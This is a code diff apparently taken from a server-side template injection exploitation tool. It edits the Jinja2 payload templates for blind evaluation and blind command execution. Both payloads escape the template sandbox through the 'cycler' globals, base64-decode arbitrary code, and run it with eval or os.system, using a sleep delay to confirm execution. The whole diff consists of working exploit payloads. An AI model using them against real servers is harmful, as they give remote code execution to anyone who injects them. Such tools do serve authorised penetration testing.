@@ -43,7 +43,7 @@ class Jinja2(python.Python):
             },
             'evaluate_boolean': {
                 'call': 'inject',
-                'evaluate_blind': """{{{{1 / (not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
+                'evaluate_blind': """{{{{1/(not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
             },
             'execute': {
                 'call': 'render',
@@ -54,7 +54,7 @@ class Jinja2(python.Python):
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}"""
+                'execute_blind': """{{{{cycler.__init__.__globals__.os.system(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())==0 and cycler.__init__.__globals__.__builtins__.__import__('time').sleep({delay})}}}}"""
             },
         })
 
